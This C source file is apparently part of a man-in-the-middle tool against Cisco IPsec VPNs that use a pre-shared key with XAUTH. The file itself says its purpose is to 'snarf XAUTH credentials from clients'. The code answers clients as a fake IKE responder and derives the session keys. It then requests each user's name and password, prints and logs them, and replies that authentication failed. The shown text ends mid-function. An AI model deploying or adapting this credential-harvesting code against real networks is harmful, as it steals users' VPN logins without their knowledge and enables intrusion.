/*
 * IKE MITM for Cisco PSK+XAUTH.
 * Copyright (C) 2005, Daniel Roethlisberger <daniel@roe.ch>
 * 
 * All rights reserved.  This is unpublished work.  Unauthorized use,
 * distribution in source or binary form, modified or unmodified, is
 * strictly prohibited.
 * 
 * $Id$
 */

#include "ike.h"
#include "datagram.h"
#include "results.h"
#include "peer_ctx.h"
#include "vpnc/math_group.h"
#include "vpnc/dh.h"

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <gcrypt.h>

/*
 * NOTICE: This code is unsuitable for implementing a genuine IKE responder!
 *         It's very likely to be any or all of: insecure, incompatible,
 *         inefficient, unstable, unportable, or outright broken.
 *         There's hardly enough sanity checking and failure resistance.
 *         If you want genuine IKE source code, look for a proper
 *         implementation instead.  This is a quick hack to snarf XAUTH
 *         credentials from clients, not a full implementation of IKE.
 */



/* forward declarations */
void ike_process_new(peer_ctx *ctx, struct isakmp_packet *ikp);

/* minimum */
static inline int min(int a, int b)
{
	return (a < b) ? a : b;
}

/* vendor ids */
static const uint8_t xauth_vid[] = XAUTH_VENDOR_ID;



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * IKE encryption and decryption routines                                    *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Encrypts or decrypts the buffer buf.
 * Buf must already be padded to blocksize of the encryption algorithm in use.
 */
void ike_crypt_crypt(int algo, int enc, uint8_t *buf, size_t buflen,
	uint8_t *key, size_t keylen, uint8_t *iv, size_t ivlen)
{
	gcry_cipher_hd_t crypt_ctx;
	gcry_cipher_open(&crypt_ctx, algo, GCRY_CIPHER_MODE_CBC, 0);
	gcry_cipher_setkey(crypt_ctx, key, keylen);
	gcry_cipher_setiv(crypt_ctx, iv, ivlen);
	if(!enc)
		gcry_cipher_decrypt(crypt_ctx, buf, buflen, NULL, 0);
	else
		gcry_cipher_encrypt(crypt_ctx, buf, buflen, NULL, 0);
	gcry_cipher_close(crypt_ctx);
}

/*
 * Generic encryption/decryption routine.
 * If payload of ikp is encrypted, decrypt it, if not, encrypt it.
 * Handles phase 1 and phase 2 enc/dec, and IV generation.
 */
int ike_crypt(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	/*
	 * phase 1, first:	iv = hash(i_dh_public r_dh_public)
	 * phase 1, rest:	iv = last_block_phase1
	 * phase 2, first:	iv = hash(last_block_phase1 message_id)
	 * phase 2, rest:	iv = last_block_phase2
	 */

	uint8_t *iv = NULL;
	int update_iv = 1;
	uint8_t *fp = NULL;
	size_t fp_len;
	uint8_t fp_type;
	gcry_md_hd_t md_ctx;
	int reject = 0;
	message_iv *msg_iv = NULL;

	int enc = !(ikp->flags & ISAKMP_FLAG_E);

	switch(ctx->state) {
	case STATE_PHASE1:
		/* iv0 not set means no phase 1 encrypted packets yet */
		if(!ctx->iv0) {
			/* generate initial phase 1 iv */
			gcry_md_open(&md_ctx, ctx->md_algo, 0);
			gcry_md_write(md_ctx, ctx->dh_i_public,
				dh_getlen(ctx->dh_group));
			gcry_md_write(md_ctx, ctx->dh_r_public,
				dh_getlen(ctx->dh_group));
			gcry_md_final(md_ctx);
			ctx->iv0 = malloc(ctx->blk_len);
			memcpy(ctx->iv0, gcry_md_read(md_ctx, 0), ctx->blk_len);
			gcry_md_close(md_ctx);
		}
		iv = ctx->iv0;
		break;

	case STATE_PHASE2:
		/* fetch message_iv for this exchange */
		msg_iv = get_message_iv(ikp->message_id, &ctx->msg_iv);
		if(!msg_iv->iv) {
			/* generate initial phase 2 iv */
			gcry_md_open(&md_ctx, ctx->md_algo, 0);
			gcry_md_write(md_ctx, ctx->iv0, ctx->blk_len);
			/* XXX: only works for intel endianness */
			gcry_md_putc(md_ctx, (ikp->message_id >> 24) & 0xFF);
			gcry_md_putc(md_ctx, (ikp->message_id >> 16) & 0xFF);
			gcry_md_putc(md_ctx, (ikp->message_id >> 8) & 0xFF);
			gcry_md_putc(md_ctx, (ikp->message_id) & 0xFF);
			gcry_md_final(md_ctx);
			msg_iv->iv = malloc(ctx->md_len);
			memcpy(msg_iv->iv, gcry_md_read(md_ctx, 0), ctx->blk_len);
			gcry_md_close(md_ctx);
		}
		iv = msg_iv->iv;
		break;

	default:
		fprintf(stderr, "[%s:%d]: ike_crypt in illegal state %d, packet ignored\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port),
			ctx->state);
		return -1;
		break;
	}

	if(enc) {
		/* flatten and encrypt payload */
		fp_type = ikp->u.payload->type;
		flatten_isakmp_payload(ikp->u.payload, &fp, &fp_len,
			ctx->blk_len);
		ike_crypt_crypt(ctx->algo, enc, fp, fp_len,
			ctx->key, ctx->key_len, iv, ctx->blk_len);
		/* swap payload for encrypted buffer */
		free_isakmp_payload(ikp->u.payload);
		ikp->u.enc.length = fp_len;
		ikp->u.enc.data = malloc(ikp->u.enc.length);
		memcpy(ikp->u.enc.data, fp, ikp->u.enc.length);
		ikp->u.enc.type = fp_type;
		/* update IV with last cipher block */
		if(update_iv) {
			memcpy(iv, fp + fp_len - ctx->blk_len, ctx->blk_len);
		}
	} else { /* dec */
		uint8_t *newiv = NULL;
		/* copy encrypted buffer */
		fp_len = ikp->u.enc.length;
		fp = malloc(fp_len);
		memcpy(fp, ikp->u.enc.data, fp_len);
		/* store last cipher block */
		if(update_iv) {
			newiv = malloc(ctx->blk_len);
			memcpy(newiv, fp + fp_len - ctx->blk_len, ctx->blk_len);
		}
		/* decrypt encrypted buffer */
		ike_crypt_crypt(ctx->algo, enc, fp, fp_len,
			ctx->key, ctx->key_len, iv, ctx->blk_len);
		/* copy stored last cipher block to iv */
		if(update_iv) {
			memcpy(iv, newiv, ctx->blk_len);
			free(newiv);
			newiv = NULL;
		}
		/* swap encrypted buffer for decoded payload */
		const uint8_t *cfp = fp;
		struct isakmp_payload *pl = parse_isakmp_payload(
			ikp->u.enc.type,
			&cfp, &fp_len, &reject);
		if(reject) {
			fprintf(stderr, "[%s:%d]: illegal decrypted payload (%d), packet ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				reject);
			return reject;
		}
		free(ikp->u.enc.data);
		ikp->u.payload = pl;
	}

	if(fp) {
		free(fp);
		fp = NULL;
	}

	/* flip the "encrypted" flag */
	ikp->flags ^= ISAKMP_FLAG_E;

	return 0;
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Security Association payload helpers                                      *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Is this a supported SA transform?
 * Currently selects 3DES-CBC, MD5, group2.
 */
int sa_transform_matches(peer_ctx* ctx, struct isakmp_payload *t)
{
	struct isakmp_attribute *enc = NULL;
	struct isakmp_attribute *hash = NULL;
	struct isakmp_attribute *auth_method = NULL;
	struct isakmp_attribute *group_desc = NULL;
	for(struct isakmp_attribute *a = t->u.t.attributes; a; a = a->next) {
		switch(a->type) {
			case IKE_ATTRIB_ENC:
				enc = a;
				break;
			case IKE_ATTRIB_HASH:
				hash = a;
				break;
			case IKE_ATTRIB_AUTH_METHOD:
				auth_method = a;
				break;
			case IKE_ATTRIB_GROUP_DESC:
				group_desc = a;
				break;
			default:
				/* silently ignore */
				break;
		}
	}

	/* do we have all required attributed? */
	if(!(enc && hash && auth_method && group_desc)) {
		printf("[%s:%d]: missing attribute(s): enc=%p hash=%p auth_method=%p group_desc=%p\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port),
			(void*)enc, (void*)hash, (void*)auth_method, (void*)group_desc);
		return 0;
	}

	/* choose */
	return (enc->u.attr_16 == IKE_ENC_3DES_CBC
		&& hash->u.attr_16 == IKE_HASH_MD5
		&& auth_method->u.attr_16 == IKE_AUTH_XAUTHInitPreShared
		&& group_desc->u.attr_16 == IKE_GROUP_MODP_1024);
}

/*
 * Walk proposal SA, copy relevant stuff to response SA.
 * Currently selects 3DES-CBC MD5 group2, hardwired.
 */
void sa_populate_from(peer_ctx* ctx, struct isakmp_payload *response, struct isakmp_payload *proposal)
{
	/* copy SA payload */
	*response = *proposal;
	response->u.sa.proposals = new_isakmp_payload(ISAKMP_PAYLOAD_P);

	/* copy proposals payload */
	*response->u.sa.proposals = *proposal->u.sa.proposals;
	response->u.sa.proposals->u.p.transforms =
		new_isakmp_payload(ISAKMP_PAYLOAD_T);

	/* find matching transform */
	struct isakmp_payload *p;
	for(p = proposal->u.sa.proposals->u.p.transforms; p; p = p->next) {
		if(sa_transform_matches(ctx, p))
			break;
	}
	if(!p) {
		printf("[%s:%d]: no matching algo proposal, ignoring request\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		return;
	}

	/* copy chosen transform payload */
	*response->u.sa.proposals->u.p.transforms = *p;
	response->u.sa.proposals->u.p.transforms->next = NULL;

	struct isakmp_attribute *ra = NULL;
	for(struct isakmp_attribute *pa = p->u.t.attributes; pa; pa = pa->next) {
		if(!ra) {
			/* first attribute */
			ra = response->u.sa.proposals->u.p.transforms->u.t.attributes =
				new_isakmp_attribute(pa->type, NULL);
		} else {
			/* subsequent attributes */
			ra->next = new_isakmp_attribute(pa->type, NULL);
			ra = ra->next;
		}
		*ra = *pa;
		ra->next = NULL;
	}

	/* store algorithm identifyers in peer context */
	ctx->algo = GCRY_CIPHER_3DES;			/* not sexy */
	ctx->md_algo = GCRY_MD_MD5;			/* not sexy */
	ctx->dh_group = group_get(OAKLEY_GRP_2);	/* not sexy */
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Informational packet handler                                              *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Process an IKE Informational packet.
 * Packet must already be decrypted.
 */
void ike_process_informational(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	if(ikp->flags & ISAKMP_FLAG_E) {
		printf("[%s:%d]: encrypted informational packet, reset state\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		reset_peer_ctx(ctx);
		return;
	}

	for(struct isakmp_payload *p = ikp->u.payload; p; p = p->next) {
	switch(p->type) {
		case ISAKMP_PAYLOAD_N:
			if(p->u.n.type == ISAKMP_N_INVALID_PAYLOAD_TYPE) {
				printf("[%s:%d]: error from peer: invalid payload type, reset state\n",
					inet_ntoa(ctx->peer_addr.sin_addr),
					ntohs(ctx->peer_addr.sin_port));
					reset_peer_ctx(ctx);
			} else {
				printf("[%s:%d]: unhandled informational notification type 0x%02x, ignored\n",
					inet_ntoa(ctx->peer_addr.sin_addr),
					ntohs(ctx->peer_addr.sin_port),
					p->u.n.type);
			}
			break;

		case ISAKMP_PAYLOAD_HASH:
			/* a real IKE responder would check against stored hash
			 * and drop packet if invalid -- we just ignore it
			 */
			break;

		default:
			printf("[%s:%d]: unhandled informational payload type 0x%02x, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				p->type);
			break;
	}}
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Phase 2 handlers                                                          *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
   IKE Initiator                                         IKE Responder
   --------------                                    -----------------
                                       <-- REQUEST(NAME="" PASSWORD="")
   REPLY(NAME="joe" PASSWORD="foobar") -->
                                                    <-- SET(STATUS=OK)
   ACK(STATUS) -->
*/

/*
 * Begin XAUTH login.
 * REQUEST(NAME="" PASSWORD="")
 */
void ike_do_phase2_xauth_begin(peer_ctx *ctx)
{
	struct isakmp_packet *r = new_isakmp_packet();
	memcpy(r->i_cookie, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	memcpy(r->r_cookie, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	r->isakmp_version = ctx->isakmp_version;
	r->exchange_type = ISAKMP_EXCHANGE_MODECFG_TRANSACTION;
	r->flags = 0;
	gcry_create_nonce((uint8_t*)&r->message_id, sizeof(r->message_id));

	r->u.payload = new_isakmp_data_payload(ISAKMP_PAYLOAD_HASH,
		ctx->r_hash, ctx->md_len);

	r->u.payload->next = new_isakmp_payload(ISAKMP_PAYLOAD_MODECFG_ATTR);
	r->u.payload->next->u.modecfg.type = ISAKMP_MODECFG_CFG_REQUEST;
	r->u.payload->next->u.modecfg.attributes =
		new_isakmp_attribute(ISAKMP_XAUTH_ATTRIB_USER_NAME,
			new_isakmp_attribute(ISAKMP_XAUTH_ATTRIB_USER_PASSWORD, 0)
		);
	struct isakmp_attribute *a = r->u.payload->next->u.modecfg.attributes;
	a->af = isakmp_attr_lots;
	a->u.lots.length = 0;
	a->u.lots.data = NULL;
	a = a->next;
	a->af = isakmp_attr_lots;
	a->u.lots.length = 0;
	a->u.lots.data = NULL;

	/* send response */
	datagram *dgm = new_datagram(0);
	ike_crypt(ctx, r);
	flatten_isakmp_packet(r, &dgm->data, &dgm->len, ctx->blk_len);
	dgm->peer_addr = ctx->peer_addr;
	dgm->sockfd = ctx->cfg->sockfd;
	send_datagram(dgm);
}

/*
 * Handle XAUTH replies.
 * REPLY(NAME="joe" PASSWORD="foobar")
 */
void ike_do_phase2_xauth(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	for(struct isakmp_attribute *a =
		ikp->u.payload->next->u.modecfg.attributes; a; a = a->next) {
		switch(a->type) {
			case ISAKMP_XAUTH_ATTRIB_USER_NAME:
				if(ctx->xauth_username)
					free(ctx->xauth_username);
				ctx->xauth_username = malloc(a->u.lots.length + 1);
				memcpy(ctx->xauth_username, a->u.lots.data, a->u.lots.length);
				ctx->xauth_username[a->u.lots.length] = '\0';
				printf("[%s:%d]: Xauth username: %s\n",
					inet_ntoa(ctx->peer_addr.sin_addr),
					ntohs(ctx->peer_addr.sin_port),
					ctx->xauth_username);
				break;
			case ISAKMP_XAUTH_ATTRIB_USER_PASSWORD:
				if(ctx->xauth_password)
					free(ctx->xauth_password);
				ctx->xauth_password = malloc(a->u.lots.length + 1);
				memcpy(ctx->xauth_password, a->u.lots.data, a->u.lots.length);
				ctx->xauth_password[a->u.lots.length] = '\0';
				printf("[%s:%d]: Xauth password: %s\n",
					inet_ntoa(ctx->peer_addr.sin_addr),
					ntohs(ctx->peer_addr.sin_port),
					ctx->xauth_password);
				break;
			default:
				printf("[%s:%d]: unhandled modecfg attr type 0x%02x, ignored\n",
					inet_ntoa(ctx->peer_addr.sin_addr),
					ntohs(ctx->peer_addr.sin_port),
					a->type);
				break;
		}
	}

	/* log credentials */
	results_add(ctx);

	/* give client feedback in form of an auth failed message */
	struct isakmp_packet *r = new_isakmp_packet();
	memcpy(r->i_cookie, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	memcpy(r->r_cookie, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	r->isakmp_version = ctx->isakmp_version;
	r->exchange_type = ISAKMP_EXCHANGE_MODECFG_TRANSACTION;
	r->flags = 0;
	gcry_create_nonce((uint8_t*)&r->message_id, sizeof(r->message_id));

	r->u.payload = new_isakmp_data_payload(ISAKMP_PAYLOAD_HASH,
		ctx->r_hash, ctx->md_len);

	r->u.payload->next = new_isakmp_payload(ISAKMP_PAYLOAD_MODECFG_ATTR);
	r->u.payload->next->u.modecfg.type = ISAKMP_MODECFG_CFG_SET;
	r->u.payload->next->u.modecfg.attributes =
		new_isakmp_attribute(ISAKMP_XAUTH_ATTRIB_STATUS, 0);
	struct isakmp_attribute *a = r->u.payload->next->u.modecfg.attributes;
	a->af = isakmp_attr_16;
	a->u.attr_16 = 0;

	/* send response */
	datagram *dgm = new_datagram(0);
	ike_crypt(ctx, r);
	flatten_isakmp_packet(r, &dgm->data, &dgm->len, ctx->blk_len);
	dgm->peer_addr = ctx->peer_addr;
	dgm->sockfd = ctx->cfg->sockfd;
	send_datagram(dgm);
}

/*
 * Process MODECFG packets.
 */
void ike_process_phase2_modecfg(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	switch(ikp->u.payload->next->u.modecfg.type) {
		case ISAKMP_MODECFG_CFG_REPLY:
			ike_do_phase2_xauth(ctx, ikp);
			break;

		case ISAKMP_MODECFG_CFG_ACK:
			/* final ACK(STATUS) for our SET(STATUS=FAIL) */
			printf("[%s:%d]: IKE session terminated\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port));
			reset_peer_ctx(ctx);
			break;

		default:
			printf("[%s:%d]: unhandled modecfg type 0x%02x, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				ikp->u.payload->next->u.modecfg.type);
			break;
	}
}

/*
 * Process an IKE packet in STATE_PHASE2.
 * Handles decryption.
 */
void ike_process_phase2(peer_ctx *ctx, struct isakmp_packet *ikp) {
	if(!(ikp->flags & ISAKMP_FLAG_E)) {
		printf("[%s:%d]: unencrypted packet in STATE_PHASE2, reset state\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port));
		reset_peer_ctx(ctx);
		ike_process_new(ctx, ikp);
		return;
	}

	switch(ikp->exchange_type) {
		case ISAKMP_EXCHANGE_MODECFG_TRANSACTION:
			if(!ike_crypt(ctx, ikp))
				ike_process_phase2_modecfg(ctx, ikp);
			break;

		case ISAKMP_EXCHANGE_INFORMATIONAL:
			if(!ike_crypt(ctx, ikp))
				ike_process_informational(ctx, ikp);
			break;

		default:
			printf("[%s:%d]: unhandled exchange type 0x%02x in STATE_PHASE1, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				ikp->exchange_type);
			break;
	}
}



/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 * Phase 1 handlers                                                          *
 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

/*
 * Process an IKE Aggressive Mode packet in STATE_NEW.
 */
void ike_do_phase1(peer_ctx *ctx, struct isakmp_packet *ikp)
{
	/* get the payloads */
	struct isakmp_payload *sa = NULL;
	struct isakmp_payload *ke = NULL;
	struct isakmp_payload *nonce = NULL;
	struct isakmp_payload *id = NULL;
	for(struct isakmp_payload *p = ikp->u.payload; p; p = p->next) {
	switch(p->type) {
		case ISAKMP_PAYLOAD_SA:
			sa = p;
			break;

		case ISAKMP_PAYLOAD_KE:
			ke = p;
			break;

		case ISAKMP_PAYLOAD_NONCE:
			nonce = p;
			break;

		case ISAKMP_PAYLOAD_ID:
			id = p;
			break;

		case ISAKMP_PAYLOAD_VID:
			/* silently ignore for now */
			break;

		default:
			printf("[%s:%d]: unhandled payload type 0x%02x, ignored\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				p->type);
			break;
	}}

	/* do we have all payloads? */
	if(!(sa && ke && nonce && id)) {
		printf("[%s:%d]: missing payload(s): sa=%p ke=%p nonce=%p id=%p, ignored\n",
			inet_ntoa(ctx->peer_addr.sin_addr),
			ntohs(ctx->peer_addr.sin_port),
			(void*)sa, (void*)ke, (void*)nonce, (void*)id);
		return;
	}

	/* heads up: the ipsec id */
	switch(id->u.id.type) {
		case ISAKMP_IPSEC_ID_FQDN:
		case ISAKMP_IPSEC_ID_USER_FQDN:
		case ISAKMP_IPSEC_ID_KEY_ID:
			if(ctx->ipsec_id)
				free(ctx->ipsec_id);
			ctx->ipsec_id = malloc(id->u.id.length + 1);
			memcpy(ctx->ipsec_id, id->u.id.data, id->u.id.length);
			ctx->ipsec_id[id->u.id.length] = '\0';
			printf("[%s:%d]: IPSec ID: %s\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				ctx->ipsec_id);
			break;

		default:
			printf("[%s:%d]: binary ID type %d, processing packet anyway\n",
				inet_ntoa(ctx->peer_addr.sin_addr),
				ntohs(ctx->peer_addr.sin_port),
				id->u.id.type);
			break;
	}

	/* grab proto version */
	ctx->isakmp_version = ikp->isakmp_version;

	/* grab i_cookie */
	memcpy(ctx->i_cookie, ikp->i_cookie, ISAKMP_COOKIE_LENGTH);

	/* grab i_sa */
	struct isakmp_payload *tmp = sa->next;
	sa->next = NULL;
	flatten_isakmp_payload(sa, &ctx->i_sa, &ctx->i_sa_len, 1);
	sa->next = tmp;

	/* grab dh_i_public */
	ctx->dh_i_public = malloc(ke->u.ke.length);
	memcpy(ctx->dh_i_public, ke->u.ke.data, ke->u.ke.length);

	/* grab i_nonce */
	ctx->i_nonce = malloc(nonce->u.nonce.length);
	ctx->i_nonce_len = nonce->u.nonce.length;
	memcpy(ctx->i_nonce, nonce->u.nonce.data, nonce->u.nonce.length);

	/* grab i_id */
	tmp = id->next;
	id->next = NULL;
	flatten_isakmp_payload(id, &ctx->i_id, &ctx->i_id_len, 1);
	id->next = tmp;

	/* generate r_cookie */
	gcry_create_nonce(ctx->r_cookie, ISAKMP_COOKIE_LENGTH);

	/* generate r_nonce */
	ctx->r_nonce_len = ctx->i_nonce_len;
	ctx->r_nonce = malloc(ctx->r_nonce_len);
	gcry_create_nonce(ctx->r_nonce, ctx->r_nonce_len);

	/* header */
	struct isakmp_packet *r = new_isakmp_packet();
	memcpy(r->i_cookie, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	memcpy(r->r_cookie, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	r->isakmp_version = ikp->isakmp_version;
	r->exchange_type = ikp->exchange_type;
	r->flags = 0;
	r->message_id = ikp->message_id;

	/* payload: sa */
	r->u.payload = new_isakmp_payload(ISAKMP_PAYLOAD_SA);
	sa_populate_from(ctx, r->u.payload, sa);
	struct isakmp_payload *p = r->u.payload;

	/* set up hashing */
	ctx->md_len = gcry_md_get_algo_dlen(ctx->md_algo);

	/* complete dh key exchange */
	ctx->dh_r_public = malloc(dh_getlen(ctx->dh_group));
	dh_create_exchange(ctx->dh_group, ctx->dh_r_public);
	ctx->dh_secret = malloc(dh_getlen(ctx->dh_group));
	dh_create_shared(ctx->dh_group, ctx->dh_secret, ctx->dh_i_public);

	/* payload: ke */
	p = p->next = new_isakmp_data_payload(ISAKMP_PAYLOAD_KE,
		ctx->dh_r_public, dh_getlen(ctx->dh_group));

	/* payload: nonce_r */
	p = p->next = new_isakmp_data_payload(ISAKMP_PAYLOAD_NONCE,
		ctx->r_nonce, ctx->r_nonce_len);

	/* payload: id_r */
	p = p->next = new_isakmp_payload(ISAKMP_PAYLOAD_ID);
	p->u.id.type = ISAKMP_IPSEC_ID_IPV4_ADDR;
	p->u.id.protocol = IPPROTO_UDP;
	p->u.id.port = IKE_PORT;
	p->u.id.length = sizeof(in_addr_t);
	p->u.id.data = malloc(p->u.id.length);
	*((in_addr_t*)p->u.id.data) = inet_addr(ctx->cfg->gateway);
	flatten_isakmp_payload(p, &ctx->r_id, &ctx->r_id_len, 1);

	/*
	 * SKEYID = hmac(pre-shared-key, Nonce_I | Nonce_R)
	 * SKEYID_e = hmac(SKEYID, SKEYID_a | g^xy | Cookie_I | Cookie_R | 2)
	 * SKEYID_a = hmac(SKEYID, SKEYID_d | g^xy | Cookie_I | Cookie_R | 1)
	 * SKEYID_d = hmac(SKEYID, g^xy | Cookie_I | Cookie_R | 0)
	 */

	gcry_md_hd_t md_ctx;

	/* generate skeyid */
	gcry_md_open(&md_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(md_ctx, ctx->cfg->psk, strlen(ctx->cfg->psk));
	gcry_md_write(md_ctx, ctx->i_nonce, ctx->i_nonce_len);
	gcry_md_write(md_ctx, ctx->r_nonce, ctx->r_nonce_len);
	gcry_md_final(md_ctx);
	ctx->skeyid = malloc(ctx->md_len);
	memcpy(ctx->skeyid, gcry_md_read(md_ctx, 0), ctx->md_len);
	gcry_md_close(md_ctx);

	/* skeyid_e */
	gcry_md_open(&md_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(md_ctx, ctx->skeyid, ctx->md_len);
	gcry_md_write(md_ctx, ctx->dh_secret, dh_getlen(ctx->dh_group));
	gcry_md_write(md_ctx, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(md_ctx, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_putc(md_ctx, 0);
	gcry_md_final(md_ctx);
	ctx->skeyid_d = malloc(ctx->md_len);
	memcpy(ctx->skeyid_d, gcry_md_read(md_ctx, 0), ctx->md_len);
	gcry_md_close(md_ctx);

	/* skeyid_a */
	gcry_md_open(&md_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(md_ctx, ctx->skeyid, ctx->md_len);
	gcry_md_write(md_ctx, ctx->skeyid_d, ctx->md_len);
	gcry_md_write(md_ctx, ctx->dh_secret, dh_getlen(ctx->dh_group));
	gcry_md_write(md_ctx, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(md_ctx, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_putc(md_ctx, 1);
	gcry_md_final(md_ctx);
	ctx->skeyid_a = malloc(ctx->md_len);
	memcpy(ctx->skeyid_a, gcry_md_read(md_ctx, 0), ctx->md_len);
	gcry_md_close(md_ctx);

	/* skeyid_d */
	gcry_md_open(&md_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(md_ctx, ctx->skeyid, ctx->md_len);
	gcry_md_write(md_ctx, ctx->skeyid_a, ctx->md_len);
	gcry_md_write(md_ctx, ctx->dh_secret, dh_getlen(ctx->dh_group));
	gcry_md_write(md_ctx, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(md_ctx, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_putc(md_ctx, 2);
	gcry_md_final(md_ctx);
	ctx->skeyid_e = malloc(ctx->md_len);
	memcpy(ctx->skeyid_e, gcry_md_read(md_ctx, 0), ctx->md_len);
	gcry_md_close(md_ctx);

	/* encryption key */
	gcry_cipher_algo_info(ctx->algo, GCRYCTL_GET_BLKLEN, NULL, &(ctx->blk_len));
	gcry_cipher_algo_info(ctx->algo, GCRYCTL_GET_KEYLEN, NULL, &(ctx->key_len));
	ctx->key = malloc(ctx->key_len);
	if(ctx->key_len > ctx->md_len) {
		for(int i = 0; i * ctx->md_len < ctx->key_len; i++) {
			gcry_md_open(&md_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
			gcry_md_setkey(md_ctx, ctx->skeyid_e, ctx->md_len);
			if(i == 0)
				gcry_md_putc(md_ctx, 0);
			else
				gcry_md_write(md_ctx,
					ctx->key + (i - 1) * ctx->md_len,
					ctx->md_len);
			gcry_md_final(md_ctx);
			memcpy(ctx->key + i * ctx->md_len,
				gcry_md_read(md_ctx, 0),
				min(ctx->md_len, ctx->key_len - i * ctx->md_len));
			gcry_md_close(md_ctx);
		}
	} else {
		memcpy(ctx->key, ctx->skeyid_e, ctx->key_len);
	}

	/*
	 * HASH_I = prf(SKEYID, g^x | g^y | Cookie_I | Cookie_R | SA_I | ID_I )
	 * HASH_R = prf(SKEYID, g^y | g^x | Cookie_R | Cookie_I | SA_I | ID_R )
	 */

	/* generate i_hash */
	gcry_md_hd_t i_hash_ctx;
	gcry_md_open(&i_hash_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(i_hash_ctx, ctx->skeyid, ctx->md_len);
	gcry_md_write(i_hash_ctx, ctx->dh_i_public, dh_getlen(ctx->dh_group));
	gcry_md_write(i_hash_ctx, ctx->dh_r_public, dh_getlen(ctx->dh_group));
	gcry_md_write(i_hash_ctx, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(i_hash_ctx, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(i_hash_ctx, ctx->i_sa + 4, ctx->i_sa_len - 4);
	gcry_md_write(i_hash_ctx, ctx->i_id + 4, ctx->i_id_len - 4);
	gcry_md_final(i_hash_ctx);
	ctx->i_hash = malloc(ctx->md_len);
	memcpy(ctx->i_hash, gcry_md_read(i_hash_ctx, 0), ctx->md_len);
	gcry_md_close(i_hash_ctx);

	/* generate r_hash */
	gcry_md_hd_t r_hash_ctx;
	gcry_md_open(&r_hash_ctx, ctx->md_algo, GCRY_MD_FLAG_HMAC);
	gcry_md_setkey(r_hash_ctx, ctx->skeyid, ctx->md_len);
	gcry_md_write(r_hash_ctx, ctx->dh_r_public, dh_getlen(ctx->dh_group));
	gcry_md_write(r_hash_ctx, ctx->dh_i_public, dh_getlen(ctx->dh_group));
	gcry_md_write(r_hash_ctx, ctx->r_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(r_hash_ctx, ctx->i_cookie, ISAKMP_COOKIE_LENGTH);
	gcry_md_write(r_hash_ctx, ctx->i_sa + 4, ctx->i_sa_len - 4);
	gcry_md_write(r_hash_ctx, ctx->r_id + 4, ctx->r_id_len - 4);
	gcry_md_final(r_hash_ctx);
	ctx->r_hash = malloc(ctx->md_len);
	memcpy(ctx->r_hash, gcry_md_read(r_hash_ctx, 0), ctx->md_len);
	gcry_md_close(r_hash_ctx);

	/* payload: hash_r */
	p = p->next = new_isakmp_data_payload(ISAKMP_PAYLOAD_HASH,
		ctx->r_hash, ctx->md_len);

	/* payload: XAUTH vendor id */
	p = p->next = new_isakmp_data_payload(ISAKMP_PAYLOAD_VID,
		xauth_vid, sizeof(xauth_vid));

	/* send response */
	datagram *dgm = new_datagram(0);
